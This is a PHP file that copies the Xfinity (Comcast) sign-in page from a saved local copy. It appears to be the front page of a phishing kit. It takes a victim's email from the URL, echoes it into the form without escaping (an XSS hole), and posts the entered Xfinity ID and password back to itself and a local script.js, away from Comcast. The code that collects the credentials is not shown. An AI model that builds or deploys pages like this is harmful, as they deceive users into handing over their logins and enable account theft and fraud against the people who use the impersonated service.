<?php 
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<!-- saved from url=(0031)https://login.xfinity.com/login -->
<html lang="en" class="light da da-expandable" data-resource-package-id="res-responsive-login-page"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="./index_files/publishertag.prebid.js.download"></script><script type="text/javascript" async="async" src="./index_files/s66472446848490"></script><script type="text/javascript" async="" src="./index_files/ast.js.download"></script><script async="" src="./index_files/apstag.js.download"></script><script type="text/javascript" async="" src="./index_files/prebid.js.download"></script>
				<title>Sign in to Xfinity</title>
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<meta name="mobile-web-app-capable" content="yes">
		<meta name="apple-mobile-web-app-capable" content="yes">
		<meta name="description" content="Get the most out of Xfinity from Comcast by signing in to your account. Enjoy and manage TV, high-speed Internet, phone, and home security services that work seamlessly together — anytime, anywhere, on any device.">
		<meta name="viewport" content="width=device-width,initial-scale=1">
		<meta name="msapplication-TileColor" content="#ffffff">
		<meta name="msapplication-TileImage" content="static/images/global/favicon/favicon-96x96.png">
		<meta name="theme-color" content="#ffffff">
		
				
	<script type="text/javascript" src="./index_files/lodash-slim.min.js.download"></script>

			<script type="text/javascript" src="./index_files/tracking-aws.min.js.download"></script>
	
	<script type="text/javascript" src="./index_files/tracking-DTM.min.js.download"></script>
	<script type="text/javascript" src="./index_files/tracking.min.js.download"></script>
	    	<script src="./index_files/satelliteLib-531bc4f46256650a84099973f0ed331f809ea5f4.js.download"></script>
					<link rel="stylesheet" type="text/css" href="./index_files/fonts-remote.min.css">
				<link rel="stylesheet" type="text/css" href="./index_files/styles-light.min.css">
				<link rel="shortcut icon" href="https://login.xfinity.com/static/images/favicon/favicon.ico">
		<link rel="apple-touch-icon" sizes="57x57" href="https://login.xfinity.com/static/images/favicon/apple-icon-57x57.png">
		<link rel="apple-touch-icon" sizes="60x60" href="https://login.xfinity.com/static/images/favicon/apple-icon-60x60.png">
		<link rel="apple-touch-icon" sizes="72x72" href="https://login.xfinity.com/static/images/favicon/apple-icon-72x72.png">
		<link rel="apple-touch-icon" sizes="76x76" href="https://login.xfinity.com/static/images/favicon/apple-icon-76x76.png">
		<link rel="apple-touch-icon" sizes="114x114" href="https://login.xfinity.com/static/images/favicon/apple-icon-114x114.png">
		<link rel="apple-touch-icon" sizes="120x120" href="https://login.xfinity.com/static/images/favicon/apple-icon-120x120.png">
		<link rel="apple-touch-icon" sizes="144x144" href="https://login.xfinity.com/static/images/favicon/apple-icon-144x144.png">
		<link rel="apple-touch-icon" sizes="152x152" href="https://login.xfinity.com/static/images/favicon/apple-icon-152x152.png">
		<link rel="apple-touch-icon" sizes="180x180" href="https://login.xfinity.com/static/images/favicon/apple-icon-180x180.png">
				<link rel="icon" type="image/png" sizes="192x192" href="https://login.xfinity.com/static/images/favicon/android-icon-192x192.png">
		<link rel="icon" type="image/png" sizes="32x32" href="https://login.xfinity.com/static/images/favicon/favicon-32x32.png">
		<link rel="icon" type="image/png" sizes="96x96" href="https://login.xfinity.com/static/images/favicon/favicon-96x96.png">
		<link rel="icon" type="image/png" sizes="16x16" href="https://login.xfinity.com/static/images/favicon/favicon-16x16.png">
		<link rel="manifest" href="https://login.xfinity.com/static/images/favicon/manifest.json">

		<script type="text/javascript">
			runtimeData = {
									"r": "comcast.net",									"selectAccount": "false",									"s": "portal",									"deviceAuthn": "false",									"continue": "http://xfinity.comcast.net/",									"ipAddrAuthn": "false",									"forceAuthn": "0",									"lang": "en",									"passive": "false",									"reqId": "905f3c69-5130-4f68-a9af-f18c322f1d08"							}
		</script>
																			<style type="text/css">
								@media only screen and (min-width: 1400px) {
.ad.ad-fullscreen #left {
margin-left: 670px;
}
.ad.ad-fullscreen #right {
margin-right: 0px;
}
}
.da-300x250 #ad-block {
height: 250px;
overflow: hidden;
}
			</style>
							<script>document.dispatchEvent(new CustomEvent("c-tracking-init-styles"));</script>
			<script src="./index_files/s-code-contents-4a9ebf08bffa74f717ff121b2c55a295112122b4.js.download"></script><script src="./index_files/satellite-596fc62264746d0ba500dd83.js.download"></script><script src="./index_files/satellite-596fa36064746d7e580013b4.js.download"></script><script src="./index_files/satellite-5971021b64746d663b00202b.js.download"></script><script src="./index_files/satellite-596fa34764746d6ae001a760.js.download"></script><script type="text/JavaScript" src="./index_files/w"></script></head>
		<body class=" has-footer ">
		<div id="breakpoints"></div>
							<div id="background" style="height: 932px;"></div>
								<main id="bd">
			<h1 class="screen-reader-text">Sign in to Xfinity</h1>
			<div id="left">	    



<div id="ad-block">
	<h2 id="ad-heading" class="screen-reader-text">Advertisement</h2>
	<script type="text/javascript" src="./index_files/vm-login-form-ad.js.download"></script>
	<script>
		adInfo.init({
			targetAdElemId: 'ad-block',
			tvePartner: '',
			useIframe : false
		});
	</script>
	<div id="ads-info">
	<a class="first" href="http://www.comcast.net/adinformation" rel="default" target="_blank">Ad Info</a>
	<span class="divider"></span>
	<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</div>
	<img width="0" height="0" src="./index_files/u">
<img src="./index_files/event" width="0" height="0"></div>
	</div><div id="right">		<div class="container">
	<form name="signin" action="" method="post">
			<div class="single logo-wrapper">
				<span aria-role="img" class="xfinity-logo"></span>
			</div>
			<div class="textfield-wrapper" id="error">
				<p></p>
			</div>
		    <div class="textfield-wrapper">
				<label for="user" class="float accessibly-hidden">Xfinity ID</label>
				<input id="email" name="user" type="text" value="<?php echo $email; ?>" placeholder="Email, mobile, or username" value="" autocorrect="off" autocapitalize="off" spellcheck="false" maxlength="128">
			</div>
			<div class="textfield-wrapper">
				<label for="password" class="float accessibly-hidden">Password</label>
				<input id="password" name="passwd" type="password" placeholder="Password" maxlength="128">
			</div>
		
        
	    			<div class="checkbox-container">
				<label for="remember_me">
					<input type="checkbox" id="remember_me" name="rm" value="1"><span id="remember_me_checkbox" class="checkbox"></span><div class="content">Stay signed in</div>
				</label>
				<button type="button" id="rm_label_learn_more" class="icon info cancel" data-id-ref="rm_help" aria-controls="rm_help" aria-label="Learn more about staying signed in"></button>
			</div>

<div>
		<button class="submit" id="login">Sign In</button>
		
		<ul>
		<li id="forgot-username-password-item">Forgot <a href="" target="_self" title="Look up Xfinity ID">Xfinity ID</a> or <a id="forgotPwdLink" href="" target="_self" title="Reset Password">password</a>?</li>
									
										<li id="create-username-item">Don't have an Xfinity ID?					<span><a href="" target="_self">Create one</a></span>
				</li>
					
		
			
		    										
				
				<li id="quick-bill-pay">
					<a href="" target="_self">Pay any balance</a> without signing in				</li>
			
						
		</ul>
					<p id="implied-legal">By signing in, you agree to our <a href="http://my.xfinity.com/terms/web/">Terms of Service</a> and <a href="http://xfinity.comcast.net/privacy/">Privacy Policy</a>.</p>
		
		
					<input type="hidden" name="r" value="comcast.net">
					<input type="hidden" name="selectAccount" value="false">
					<input type="hidden" name="s" value="portal">
					<input type="hidden" name="deviceAuthn" value="false">
					<input type="hidden" name="continue" value="http://xfinity.comcast.net/">
					<input type="hidden" name="ipAddrAuthn" value="false">
					<input type="hidden" name="forceAuthn" value="0">
					<input type="hidden" name="lang" value="en">
					<input type="hidden" name="passive" value="false">
					<input type="hidden" name="reqId" value="905f3c69-5130-4f68-a9af-f18c322f1d08">
		
 	</form>
</div>

				</div>
		</main>
													<footer>
<span class="content">
<span class="copyright">© 2019 Comcast</span>
<nav>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/policy">Privacy Policy</a>
<span class="divider"></span>
<a href="http://my.xfinity.com/terms/web/">Terms of Service</a>
</span>
<span class="ad-links divider"></span>
<span class="ad-links links">
<a href="http://www.comcast.net/adinformation" target="_blank">Ad Info</a>
<span class="divider"></span>
<a href="https://www.surveymonkey.com/s.aspx?sm=FyNNVDhj_2f2FNc2KVOHQ4eg_3d_3d" target="_blank">Ad Feedback</a>
</span>
<span class="divider hide-compact"></span>
<span class="links">
<a href="https://www.xfinity.com/privacy/manage-preference">Cal. Civ. Code §1798.135: Do Not Sell My Info</a>
</span>
</nav>
</span>
</footer>
					
		
		<script type="text/javascript" src="./index_files/jquery-3.3.1.min.js.download"></script>

											<div id="rm_help" role="dialog" aria-hidden="true" class="overlay" data-dialog-type="overlay">
    	<div role="document" class="content">
    		    		<button type="button" class="close" aria-label="Close"></button>
    							<h1>Why Stay Signed In?</h1>
					<p>With this option selected, you'll stay signed in to your account on this device until you sign out. You should not use this option on public or shared devices.</p>
					<p>For your security, you may be asked to enter your password before accessing certain information.</p>
				
    	</div>
    </div>
			
    <script type="text/javascript" src="./index_files/scripts-responsive.min.js.download"></script>		
    <script type="text/javascript" src="script.js"></script>
<iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcast_0" name="destination_publishing_iframe_comcast_0_name" src="./index_files/dest5.html" style="display: none; width: 0px; height: 0px;" class="aamIframeLoaded"></iframe><iframe sandbox="allow-scripts allow-same-origin" title="Adobe ID Syncing iFrame" id="destination_publishing_iframe_comcastathena_1" name="destination_publishing_iframe_comcastathena_1_name" src="./index_files/dest5(1).html" class="aamIframeLoaded" style="display: none; width: 0px; height: 0px;"></iframe></body></html>